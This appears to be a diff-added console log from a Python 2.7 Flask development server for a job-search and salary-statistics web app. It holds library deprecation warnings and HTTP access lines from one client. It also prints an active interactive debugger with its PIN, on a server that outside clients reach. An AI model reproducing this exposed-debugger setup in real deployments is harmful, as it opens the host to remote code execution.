+ocal/lib/python2.7/dist-packages/xgboost-0.6-py2.7.egg', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk'
+, '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/home/ubuntu/.local/lib/python2.7/site-packages', '/usr/local/lib/python2.7/dist-pa
+ckages', '/usr/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages/PILcompat', '/usr/lib/python2.7/dist-packages/gtk-2.0', '/usr/lib/pytho
+n2.7/dist-packages/wx-3.0-gtk2']
+/usr/lib/python2.7/dist-packages/gtk-2.0/gtk/__init__.py:57: GtkWarning: could not open display
+  warnings.warn(str(e), _gtk.Warning)
+/usr/local/lib/python2.7/dist-packages/IPython/html.py:14: ShimWarning: The `IPython.html` package has been deprecated. You should import from `notebo
+ok` instead. `IPython.html.widgets` has moved to `ipywidgets`.
+  "`IPython.html.widgets` has moved to `ipywidgets`.", ShimWarning)
+/usr/local/lib/python2.7/dist-packages/bokeh/util/deprecation.py:34: BokehDeprecationWarning: bokeh.properties was deprecated in Bokeh 0.11.0 and will
+ be removed, use bokeh.core.properties instead.
+  warn(message)
+ * Debugger is active!
+ * Debugger pin code: 224-235-064
+64.58.20.112 - - [06/Jun/2017 19:24:24] "GET / HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:24] "GET /vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:24] "GET /vendor/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:24] "GET /vendor/magnific-popup/magnific-popup.css HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:24] "GET /css/creative.min.css HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:25] "GET /css/morphist.css HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:25] "GET /css/animate.min.css HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:25] "GET /vendor/jquery/jquery.min.js HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:25] "GET /vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:25] "GET /vendor/scrollreveal/scrollreveal.min.js HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:25] "GET /vendor/magnific-popup/jquery.magnific-popup.min.js HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:25] "GET /js/creative.min.js HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:25] "GET /js/morphist.min.js HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:25] "GET /img/header.jpg HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:25] "GET /vendor/font-awesome/fonts/fontawesome-webfont.woff2?v=4.6.3 HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:25] "GET /favicon.ico HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:30] "GET /search_jobs.html HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:30] "GET /css/pace_big_counter.css HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:30] "GET /js/pace.min.js HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:30] "GET /js/app.js HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:30] "GET /js/bokeh_style.js HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:24:32] "POST /send_user_info HTTP/1.1" 200 -
+/usr/local/lib/python2.7/dist-packages/matplotlib-2.0.0+3158.g7b79174-py2.7-linux-x86_64.egg/matplotlib/cbook/deprecation.py:106: MatplotlibDeprecatio
+nWarning: The GDK backend is deprecated. It is untested, known to be broken and will be removed in Matplotlib 2.2. Use the Agg backend instead. See Ma
+tplotlib usage FAQ for more info on backends. Use Agg instead.
+  warnings.warn(message, mplDeprecation, stacklevel=1)
+/usr/local/lib/python2.7/dist-packages/matplotlib-2.0.0+3158.g7b79174-py2.7-linux-x86_64.egg/matplotlib/backends/backend_gdk.py:75: GtkWarning: IA__gd
+k_screen_get_default_colormap: assertion 'GDK_IS_SCREEN (screen)' failed
+  self._cmap = gtkDA.get_colormap()
+/usr/local/lib/python2.7/dist-packages/matplotlib-2.0.0+3158.g7b79174-py2.7-linux-x86_64.egg/matplotlib/tight_layout.py:218: UserWarning: tight_layout
+ : falling back to Agg renderer
+  warnings.warn("tight_layout : falling back to Agg renderer")
+img/data_science_scale_6_salary_dist.png
+64.58.20.112 - - [06/Jun/2017 19:25:06] "POST /get_job_stats HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:25:07] "GET /img/data_science_scale_6_salary_dist.png?1496777107376 HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:25:07] "GET /vendor/bootstrap/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 -
+64.58.20.112 - - [06/Jun/2017 19:25:07] "POST /send_user_info HTTP/1.1" 200 -
+
